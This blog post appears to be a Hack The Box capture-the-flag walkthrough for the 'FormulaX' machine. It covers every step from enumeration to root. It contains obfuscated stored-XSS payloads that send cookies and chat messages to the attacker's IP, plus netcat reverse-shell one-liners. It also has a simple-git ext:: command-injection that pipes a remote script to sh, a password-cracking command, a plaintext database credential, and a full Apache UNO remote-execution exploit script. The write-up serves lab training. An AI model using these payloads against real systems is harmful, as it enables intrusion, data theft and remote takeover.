---
date: 2025-03-15
categories: [CTF, HTB]
title: "HTB - FormulaX"
tags: ['hashcat', 'nmap', 'privilege escalation', 'python', 'rce', 'xss']

description: "FormulaX - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - FormulaX


```bash
nmap 10.129.215.40 -A
 
```

![image1](../resources/e02d46a6e3554cff9fc358ea498db3a0.png)

- HttpOnly is set so we can't steal cookies:

![image2](../resources/b8c8004c656143ae881779cdcaae3d8c.png)

\*\* I had to reset the box a few times because of this \*\*

Server-side XSS vulnerability in the contact page's fields (all three):


![image3](../resources/1379de7c7e4644d988c88790c1eb108a.jpeg)


![image4](../resources/bf6c3ee29fff4f0fa2368167abaddb70.png)

\*\* When using eval() it is instead of the \<script\> tags

<u>To test (because we can't use alert() here):</u>

- Using the payload:  

```java
fetch("http://10.10.14.48:8085/" + document.cookie);

```
- And then obfuscating it:

Which evaluates to (injected into first name):

```java
\<img src="x" onerror='eval(atob("ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNC40ODo4MDg1LyIgKyBkb2N1bWVudC5jb29raWUpOw=="));'/\>

```

- We get a response back:

![image5](../resources/ce43cc103d8f489bb0f06e7c08525297.png)


![image6](../resources/54882384810c4484b2b90e337efd0a6c.png)

- Trying a different payload (still base64 encoding it, etc):

```java
fetch("http://10.10.14.48:8080/?d=" + encodeURIComponent(window.location.href));

```

![image7](../resources/5390cc96eb224ca586654dba6e950044.png)

This gives us the domain  `http://chatbot.htb/admin/admin.html`

**<u>XSS Websocket - Exploit</u>**


![image8](../resources/25ecb0f0f7cc4e3d947725186fc07070.png)

- We are working with websockets here.
Looking in the page source and Burp requests we can see **sockets.io** and **axios** being used

Axios is a promise-based HTTP client for making asynchronous requests to RESTful APIs, while Socket.IO enables real-time, bidirectional communication between clients and servers using WebSockets with fallbacks.

```java
const script = document.createElement('script');
script.src = '/socket.io/socket.io.js';
document.head.appendChild(script);

script.addEventListener('load', function () {
    // Fetch user chat history
    axios.get('/user/api/chat');

    // Connect to the socket with credentials
    const socket = io('/', { withCredentials: true });

    // Listen for incoming messages and exfiltrate them
    socket.on('message', (my_message) => {
        fetch("http://10.10.14.48:8080/?d=" + btoa(my_message));
    });

    // Request chat history
    socket.emit('client_message', 'history');
});

```

This gets base64 encoded and put in to the atob() function - then paste it into first name:

```java
<img SRC=x onerror='eval(atob("Y29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CnNjcmlwdC5zcmMgPSAnL3NvY2tldC5pby9zb2NrZXQuaW8uanMnOwpkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcmlwdCk7CnNjcmlwdC5hZGRFdmVudExpc3RlbmVyKCdsb2FkJywgZnVuY3Rpb24oKSB7CmNvbnN0IHJlcyA9IGF4aW9zLmdldChgL3VzZXIvYXBpL2NoYXRgKTsgY29uc3Qgc29ja2V0ID0gaW8oJy8nLHt3aXRoQ3JlZGVudGlhbHM6IHRydWV9KTsgc29ja2V0Lm9uKCdtZXNzYWdlJywgKG15X21lc3NhZ2UpID0+IHtmZXRjaCgiaHR0cDovLzEwLjEwLjE0LjQ4Lz9kPSIgKyBidG9hKG15X21lc3NhZ2UpKX0pIDsgc29ja2V0LmVtaXQoJ2NsaWVudF9tZXNzYWdlJywgJ2hpc3RvcnknKTsKfSk7"));'/>

```
- Now we get something different back:

![image9](../resources/e73752b504d0415ab48ee80db947135f.png)


![image10](../resources/cffc656dbd7847c09372e46147099c41.png)

If we Base64 decode these - we get:


![image11](../resources/fa2386a868314089a3f6c2dcdfe7059d.png)

- We get a subdomain to add to /etc/hosts:
**dev-git-auto-update.chatbot.htb**

---------------------------------------------------------------------------------------------------------------------------------------------

- This can also be done with more native API's like Fetch:

**Replace Axios with** the native **Fetch API** for making HTTP requests.

The Fetch API is built into modern browsers and provides a powerful interface for fetching resources

```javascript
const script = document.createElement('script');
script.src = '/socket.io/socket.io.js';
document.head.appendChild(script);

script.addEventListener('load', function() {

    // Replacing Axios GET request with Fetch
    fetch(`/user/api/chat`)
        .then(response => response.json())
        .then(data => console.log(data))
        .catch(error => console.error('Error:', error));

    const socket = io('/', { withCredentials: true });

    socket.on('message', (my_message) => {
        fetch("http://10.10.14.48:8080/?d=" + btoa(my_message));
    });

    socket.emit('client_message', 'history');
});

```
After adding dev-git-auto-update.chatbot.htb to /etc/hosts, we get:


![image12](../resources/9e52a30496bf4bc0b966448d4bf00842.png)


![image13](../resources/d0b0aad8e11e481ab239349f60360509.png)

**<u>CVE-2022-25912</u>**

<https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221>

- Create a bash script:

```bash
#!/bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.48 9003 >/tmp/f
```

- Set up python server:

```bash
sudo python -m http.server 80

```
- Set up listener

- Now we need to modify the code from Snyk:

```bash
ext::sh -c curl% http://10.10.14.48/bash_script.sh|sh >&2

```
- Open Burp and intercept the POST request, change the destinationURL parameter:

![image14](../resources/6d68b5b98287490f8b5d681ba9468683.png)

- And we have a shell:

![image15](../resources/4454341727b34652840d498035a1549a.png)


![image16](../resources/2ff45631b1c44fda9b5676d15ba0abea.png)


![image17](../resources/8da03572d3e24fe7a4d4e77ec4d4fc5f.png)


![image18](../resources/8e227635977441229a296af9a47b4033.png)

- Accessing the mongo db:

![image19](../resources/9ae15c3a5cd1492eb9fecfecd3b7c100.png)


![image20](../resources/d715d3023edb427d8416df23fa5b761b.png)

- The dbs with useful information was testing -\> users

```bash
mongo
show dbs
use testing
db.users.find()
exit

```

![image21](../resources/ae4d65e80d234202b76a3be1857774f1.png)

- We can see two users (apart from root):

![image22](../resources/c14deafebf3649bd95277b5aeb71e947.png)

- Cracked frank_dorky's password:

```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

```

![image23](../resources/adb6edcf6f424e2dbc0d28a31d1f2c83.png)

- Now we can SSH in:
```bash
ssh frank_dorky@10.129.215.190

```

![image24](../resources/4437aa0eabbb4522a1e6d2f18bc75055.png)

```bash
cat user.txt

```
- Copy LinPEAS over:

```bash
scp linpeas.sh frank_dorky@10.129.215.190:/home/frank_dorky/

```

![image25](../resources/cdd5f6d5bfbf45268c518ac7ade115ef.png)


![image26](../resources/b445e9f7a6204cab973f73c83956ea23.png)

- Server running locally on port 3000

- Upload chisel to the target:

```bash
#On Kali:
./chisel server -p 8888 --reverse

#On target:
./chisel client 10.10.14.48:8888 R:socks
```

- Run FoxyProxy:

![image27](../resources/e0865d4bd8894e88986acb2b395d3c23.png)

- Go to the site:

![image28](../resources/56d5bbc53d1745e18710e8a7c32241dc.png)

- We get a login page
- The default credentials didn't work

- Add new user:

```bash
cd /opt/librenms
php adduser.php player1 player1 10

```

![image29](../resources/8a59fc7ad7624ea0b98cdd666147df64.png)

php adduser.php \<username\> \<password\> \<access level\>

\*10 is the highest level of access

- Login with new user:

![image30](../resources/fdc562b05542413cbd26258a5e632bcc.png)


![image31](../resources/3ffdb4ea13b343baa8796af2ae49e133.png)


![image32](../resources/035e375fa8f8428eb8b31603e5df5a65.png)


![image33](../resources/003c998db8f747b892884a885d19bde5.png)

- Now we can login as Kai Relay (admin)

![image34](../resources/c96aba5ccfca4368a43d3f758c40920b.png)

- If we go to Settings -\> Validate Config

![image35](../resources/7bafc8173f1440f18b7fbe3aa9d28090.png)

- We get an error:

![image36](../resources/2e6a4f704e1e4f26991a6737ad51ebb9.png)

- Add librenms.com to /etc/hosts

---------------------------


Using DNS names through chisel on 127.0.0.1 - doesn't seem to work

- So we have to port forward 3000 to our machine:

```bash
ssh -L 3000:127.0.0.1:3000 frank_dorky@10.129.215.190

```
Now we can navigate to:

`http://librenms.com:3000`

---------------------------

- If we go to Alerts -\> Alert Templates:
We can now edit them. Before it didn't allow use to do it

- Looking at one of the foo templates:

![image37](../resources/d73c0d6a321b468c94e88305ddf1cabb.png)

- We can edit the base64 with our own IP and port
- Set up a listener
- Update template

- We get a shell as librenms (not kai)

![image38](../resources/9a388fab179144a9804ac75af80e5afd.png)

- Run LinPEAS again

- We get db creds:
**kai_relay : mychemicalformulaX**


![image39](../resources/de3b938744ba490784d2dbeb2ff159d5.png)

- We can either connect to the db:

```bash
mysql -u kai_relay -p'mychemicalformulaX' librenms

```
- Or:

```bash
su kai_relay

```

![image40](../resources/c2ad6410546d468397d444a84ee5936e.png)

And kai_relay is in the sudo group

```bash
sudo -l

```

![image41](../resources/12dd9c0961fc427caea2941a71178acf.png)

Kai can run /usr/bin/office.sh as sudo


![image42](../resources/4fb678b4e1814b2d84a0357d0f65f455.png)

- The command is for launching LibreOffice Calc in a headless mode with a specific set of options, allowing for remote connections (e.g., for automation tasks)

- Run the script:

![image43](../resources/c07453b33c5d448aacbe37208123e444.png)

And connect to it:


![image44](../resources/e2802a351806404f9ff11aeae5345a4f.png)

- After googling that I found this code:
<https://www.exploit-db.com/exploits/46544>

<https://github.com/sud0woodo/ApacheUNO-RCE>

```python
import uno
from com.sun.star.system import XSystemShellExecute
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--host', help='host to connect to', dest='host', required=True)
parser.add_argument('--port', help='port to connect to', dest='port', required=True)
args = parser.parse_args()

# Define the UNO component
localContext = uno.getComponentContext()

# Define the resolver to use, this is used to connect with the API
resolver = localContext.ServiceManager.createInstanceWithContext(
    "com.sun.star.bridge.UnoUrlResolver", localContext
)

# Connect with the provided host on the provided target port
print("[+] Connecting to target...")
context = resolver.resolve(
    "uno:socket,host={0},port={1};urp;StarOffice.ComponentContext".format(args.host, args.port)
)

# Issue the service manager to spawn the SystemShellExecute module and execute shell.sh
service_manager = context.ServiceManager
print("[+] Connected to {0}".format(args.host))
shell_execute = service_manager.createInstance("com.sun.star.system.SystemShellExecute")
shell_execute.execute("./shell.sh", '', 1)

```

- Create a shell.sh with:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.48 7777 >/tmp/f

```

```bash
chmod +x shell.sh
```

- Now replace calc.exe with shell.sh
- Set up a listener

- Run the script:

![image45](../resources/f9b910b2a1a448be91c872077bd3d08f.png)


![image46](../resources/9289676e03b8471981c8a0cabeb715b8.png)